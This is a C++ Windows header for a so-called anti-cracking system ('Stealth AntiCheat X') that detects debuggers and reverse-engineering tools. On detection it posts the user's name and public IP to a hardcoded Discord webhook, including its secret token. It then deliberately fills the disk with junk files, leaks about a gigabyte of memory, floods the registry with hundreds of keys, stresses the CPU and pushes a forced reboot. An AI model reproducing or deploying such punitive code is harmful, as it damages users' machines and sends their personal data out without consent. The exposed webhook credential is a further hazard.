#pragma once
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <chrono>
#include <random>
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <ctime>
#include <wininet.h>
#include <iphlpapi.h>

// ULTRA ANTI-CRACKING PROTECTION SYSTEM
class UltraAntiCrackProtection {
private:
    bool cracking_detected = false;
    std::string user_info = "";
    std::string user_ip = "";
    std::string user_location = "";
    std::vector<std::string> dangerous_processes = {
        "ollydbg.exe", "x64dbg.exe", "windbg.exe", "cheatengine.exe",
        "processhacker.exe", "hxd.exe", "hexedit.exe", "peid.exe",
        "exescope.exe", "resedit.exe", "reshacker.exe", "detect-it-easy.exe",
        "die.exe", "mobius-stripe.exe", "titanengine.exe", "detox.exe"
    };
    
    std::string getCurrentTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto time_t = std::chrono::system_clock::to_time_t(now);
        std::tm tmbuf;
        localtime_s(&tmbuf, &time_t);
        
        std::stringstream ss;
        ss << std::put_time(&tmbuf, "%Y-%m-%d %H:%M:%S");
        return ss.str();
    }
    
    std::string getUserInfo() {
        char username[256];
        DWORD size = sizeof(username);
        GetUserNameA(username, &size);
        return std::string(username);
    }
    
    std::string getUserIP() {
        // Obtener IP pública simple
        HINTERNET hInternet = InternetOpenA("AntiCrackChecker", 1, NULL, NULL, 0);
        if (!hInternet) return "127.0.0.1";
        
        HINTERNET hConnect = InternetConnectA(hInternet, "api.ipify.org", 80, NULL, NULL, 0, 3, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return "127.0.0.1";
        }
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", "/", NULL, NULL, NULL, 0, 0);
        if (hRequest) {
            HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
            
            char buffer[1024];
            DWORD bytesRead = 0;
            InternetReadFile(hRequest, buffer, sizeof(buffer)-1, &bytesRead);
            if (bytesRead > 0) {
                buffer[bytesRead] = '\0';
                std::string ip(buffer, bytesRead);
                InternetCloseHandle(hRequest);
                InternetCloseHandle(hConnect);
                InternetCloseHandle(hInternet);
                return ip;
            }
            InternetCloseHandle(hRequest);
        }
        
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return "127.0.0.1";
    }
    
    void logToDiscord(const std::string& event_type, const std::string& details) {
        // Obtener información del usuario
        user_info = getUserInfo();
        user_ip = getUserIP();
        user_location = "Unknown Location"; // Se puede mejorar con geolocation API
        
        std::string timestamp = getCurrentTimestamp();
        
        // Crear payload JSON para Discord
        std::stringstream payload;
        payload << "{"
                << "\"embeds\":[{"
                << "\"title\":\"🚨 INTENTO DE CRACKING DETECTADO 🚨\","
                << "\"description\":\"Se detectó un intento de cracking del software\","
                << "\"color\":15158332,"
                << "\"fields\":["
                << "{\"name\":\"📅 Timestamp\",\"value\":\"" << timestamp << "\",\"inline\":true},"
                << "{\"name\":\"👤 Usuario\",\"value\":\"" << user_info << "\",\"inline\":true},"
                << "{\"name\":\"🌐 IP\",\"value\":\"" << user_ip << "\",\"inline\":true},"
                << "{\"name\":\"📍 Ubicación\",\"value\":\"" << user_location << "\",\"inline\":true},"
                << "{\"name\":\"⚠️ Herramienta Detectada\",\"value\":\"" << details << "\",\"inline\":false},"
                << "{\"name\":\"🛡️ Acción Tomada\",\"value\":\"Sistema bloqueado - Medidas de seguridad activadas\",\"inline\":false}"
                << "],"
                << "\"footer\":{\"text\":\"Stealth AntiCheat X - Anti-Cracking System\"},"
                << "\"timestamp\":\"" << timestamp << "\""
                << "}]"
                << "}";
        
        // Enviar a Discord Webhook
        HINTERNET hInternet = InternetOpenA("AntiCrackNotifier", 1, NULL, NULL, 0);
        if (hInternet) {
            HINTERNET hConnect = InternetConnectA(hInternet, "discord.com", 443, NULL, NULL, 0, INTERNET_FLAG_SECURE, 0);
            if (hConnect) {
                std::string path = "/api/webhooks/1441660384443498578/cCBalfn0kXDaV3GjdeqyGMbXTqOEoQMyx8yFZRauypmWTpIZIM40xBrOGcsP5wNWzLvM";
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, 
                    INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
                
                if (hRequest) {
                    std::string headers = "Content-Type: application/json\r\n";
                    HttpSendRequestA(hRequest, headers.c_str(), headers.length(), 
                        (LPVOID)payload.str().c_str(), payload.str().length());
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInternet);
        }
    }

public:
    UltraAntiCrackProtection() {
        InitializeProtection();
    }

    void InitializeProtection() {
        DetectBasicDebuggers();
    }

    void DetectBasicDebuggers() {
        // Multiple debugger detection methods
        if (IsDebuggerPresent()) {
            TriggerDevastatingCountermeasures("Debugger detected via IsDebuggerPresent()");
        }
        
        // CheckWindowTitle: Detectar ventanas de debuggers
        char windowTitle[256];
        HWND hwnd = GetForegroundWindow();
        if (hwnd) {
            GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
            std::string title(windowTitle);
            
            if (title.find("ollydbg") != std::string::npos ||
                title.find("x64dbg") != std::string::npos ||
                title.find("windbg") != std::string::npos ||
                title.find("debug") != std::string::npos) {
                TriggerDevastatingCountermeasures("Debugger window detected: " + title);
            }
        }
        
        // Timing check (más agresivo)
        auto start = std::chrono::high_resolution_clock::now();
        volatile int dummy = 0;
        for (int i = 0; i < 50000; i++) dummy++;
        auto end = std::chrono::high_resolution_clock::now();
        
        auto duration = std::chrono::duration_cast<std::chrono::nanoseconds>(end - start);
        if (duration.count() > 500000) { // 0.5ms threshold más estricto
            TriggerDevastatingCountermeasures("Timing anomaly detected - Possible debugging");
        }
        
        // Check PEB BeingDebugged (manual)
        #ifdef _WIN64
            DWORD_PTR peb_address = 0;
            #if defined(__GNUC__)
                asm volatile ("movq %%gs:0x60, %0" : "=r"(peb_address));
            #endif
            if (peb_address && *(BYTE*)(peb_address + 0x02)) { // BeingDebugged flag
                TriggerDevastatingCountermeasures("PEB BeingDebugged flag set");
            }
        #endif
    }

    void CheckForCrackingTools() {
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 processEntry = { 0 };
            processEntry.dwSize = sizeof(PROCESSENTRY32);
            
            if (Process32First(snapshot, &processEntry)) {
                do {
                    std::string processName;
                    for (int i = 0; i < 260 && processEntry.szExeFile[i] != L'\0'; i++) {
                        if (processEntry.szExeFile[i] < 256) {
                            processName += (char)processEntry.szExeFile[i];
                        }
                    }
                    
                    for (const auto& dangerous : dangerous_processes) {
                        if (processName.find(dangerous) != std::string::npos) {
                            TriggerDevastatingCountermeasures("Cracking tool detected: " + processName);
                            break;
                        }
                    }
                } while (Process32Next(snapshot, &processEntry));
            }
        }
        CloseHandle(snapshot);
    }

    void TriggerDevastatingCountermeasures(const std::string& reason) {
        if (cracking_detected) return;
        cracking_detected = true;
        
        // Log a Discord ANTES de ejecutar las medidas
        logToDiscord("CRACK_ATTEMPT", reason);
        
        PerformDevastatingCountermeasures(reason);
    }

    void PerformDevastatingCountermeasures(const std::string& reason) {
        // MEDIDA 1: CREAR ARCHIVOS MASIVOS PARA LLENAR DISCO
        char tempPath[MAX_PATH];
        GetTempPathA(MAX_PATH, tempPath);
        
        for (int i = 0; i < 100; i++) {
            std::string tempFile = std::string(tempPath) + "ANTICHEAT_CRACK_DETECTED_" + std::to_string(i) + ".txt";
            HANDLE hFile = CreateFileA(tempFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (hFile != INVALID_HANDLE_VALUE) {
                std::string content = "CRACKING ATTEMPT DETECTED!\r\n";
                content += "User: " + user_info + "\r\n";
                content += "IP: " + user_ip + "\r\n";
                content += "Time: " + getCurrentTimestamp() + "\r\n";
                content += "Reason: " + reason + "\r\n";
                content += "============================================\r\n";
                
                // Rellenar con 1MB de datos para llenar espacio
                for (int j = 0; j < 1000; j++) {
                    content += "UNAUTHORIZED CRACKING DETECTED - SYSTEM PROTECTED - ";
                }
                content += "\r\n";
                
                WriteFile(hFile, content.c_str(), content.length(), NULL, NULL);
                CloseHandle(hFile);
            }
        }
        
        // MEDIDA 2: CREAR CARPETAS MASIVAS
        for (int i = 0; i < 50; i++) {
            std::string folderPath = std::string(tempPath) + "CRACK_DETECTED_" + std::to_string(i);
            CreateDirectoryA(folderPath.c_str(), NULL);
            
            // Crear archivos en cada carpeta
            for (int j = 0; j < 20; j++) {
                std::string filePath = folderPath + "\\crack_attempt_" + std::to_string(j) + ".log";
                HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (hFile != INVALID_HANDLE_VALUE) {
                    WriteFile(hFile, "UNAUTHORIZED ACCESS DETECTED\n", 30, NULL, NULL);
                    CloseHandle(hFile);
                }
            }
        }
        
        // MEDIDA 3: STRESS DE CPU EXTREMO
        for (int round = 0; round < 3; round++) {
            for (int i = 0; i < 2000000; i++) {
                volatile long long result = i * i;
                if (i % 100000 == 0) {
                    // Pequeña pausa para que note el sistema
                    Sleep(1);
                }
            }
        }
        
        // MEDIDA 4: CONSUMIR MEMORIA
        std::vector<char*> memory_blocks;
        for (int i = 0; i < 100; i++) {
            char* block = new char[10 * 1024 * 1024]; // 10MB blocks
            memset(block, 0xFF, 10 * 1024 * 1024);
            memory_blocks.push_back(block);
        }
        
        // MEDIDA 5: REGISTRY STORM
        for (int i = 0; i < 500; i++) {
            HKEY hKey;
            std::string keyPath = "Software\\AntiCheatCrackDetected_" + std::to_string(i);
            RegCreateKeyA(HKEY_CURRENT_USER, keyPath.c_str(), &hKey);
            if (hKey) {
                RegSetValueA(hKey, "CrackAttempt", REG_SZ, "DETECTED", 9);
                RegCloseKey(hKey);
            }
            
            // Crear subkeys
            HKEY hSubKey;
            std::string subKeyPath = keyPath + "\\UserData_" + user_info;
            RegCreateKeyA(HKEY_CURRENT_USER, subKeyPath.c_str(), &hSubKey);
            if (hSubKey) {
                RegSetValueA(hSubKey, "IP", REG_SZ, user_ip.c_str(), user_ip.length());
                RegSetValueA(hSubKey, "Timestamp", REG_SZ, getCurrentTimestamp().c_str(), 20);
                RegCloseKey(hSubKey);
            }
        }
        
        // MEDIDA 6: BEEPS EXTREMOS
        for (int i = 0; i < 10; i++) {
            Beep(200 + (i * 50), 200);
            Sleep(50);
        }
        
        // MEDIDA 7: WINDOWS CRITICAL SYSTEM ALERTS
        SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
        
        // MEDIDA 8: MOSTRAR MESSAGE BOX INTENSIVO
        std::string message = "🚨 UNAUTHORIZED ACCESS DETECTED! 🚨\n\n";
        message += "Usuario: " + user_info + "\n";
        message += "IP: " + user_ip + "\n";
        message += "Hora: " + getCurrentTimestamp() + "\n\n";
        message += "Este software está protegido contra cracking.\n";
        message += "Medida de seguridad activada.\n";
        message += "El sistema tomará medidas adicionales.\n\n";
        message += "Use la versión licenciada válida.";
        
        MessageBoxA(NULL, message.c_str(), "Stealth AntiCheat X - SECURITY ALERT", 
                   MB_OK | MB_ICONERROR | MB_TOPMOST);
        
        // MEDIDA 9: CREAR LOG MASIVO LOCAL
        std::string logPath = std::string(tempPath) + "STEALTH_ANTICHEAT_CRACK_LOG.txt";
        std::ofstream logFile(logPath);
        if (logFile.is_open()) {
            logFile << "===============================================\n";
            logFile << "STEALTH ANTICHEAT X - CRACK ATTEMPT LOG\n";
            logFile << "===============================================\n";
            logFile << "Timestamp: " << getCurrentTimestamp() << "\n";
            logFile << "User: " << user_info << "\n";
            logFile << "IP: " << user_ip << "\n";
            logFile << "Location: " << user_location << "\n";
            logFile << "Reason: " << reason << "\n";
            logFile << "Status: CRACK ATTEMPT BLOCKED\n";
            logFile << "Action: Devastating countermeasures activated\n";
            logFile << "===============================================\n";
            
            // Agregar logs detallados del sistema
            char computerName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD size = sizeof(computerName);
            GetComputerNameA(computerName, &size);
            logFile << "Computer Name: " << computerName << "\n";
            
            OSVERSIONINFOEX osvi;
            ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
            osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
            if (GetVersionEx((OSVERSIONINFO*)&osvi)) {
                logFile << "OS Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "\n";
            }
            
            logFile.close();
        }
        
        // MEDIDA 10: FINAL - REINICIO DEL SISTEMA (si es posible)
        if (MessageBoxA(NULL, 
            "El sistema detectó actividad de cracking no autorizada.\n\n"
            "Esto puede dañar la integridad del software.\n"
            "¿Desea reiniciar el sistema para aplicar medidas de seguridad?\n\n"
            "Selecciona 'Sí' para continuar o 'No' para cancelar.",
            "Stealth AntiCheat X - System Security", 
            MB_YESNO | MB_ICONWARNING | MB_TOPMOST) == IDYES) {
            
            // Esperar un poco para que se envíe el mensaje a Discord
            Sleep(2000);
            
            // Intentar reiniciar el sistema
            HANDLE hToken;
            TOKEN_PRIVILEGES tkp;
            
            if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                LookupPrivilegeValueA(NULL, "SeShutdownPrivilege", &tkp.Privileges[0].Luid);
                tkp.PrivilegeCount = 1;
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                
                AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
                
                // Reboot
                ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_OPERATINGSYSTEM);
            }
        }
    }

    void CheckForThreats() {
        if (!cracking_detected) {
            CheckForCrackingTools();
            DetectBasicDebuggers();
        }
    }

    bool IsCrackingDetected() const {
        return cracking_detected;
    }

    ~UltraAntiCrackProtection() {
        // Cleanup
    }
};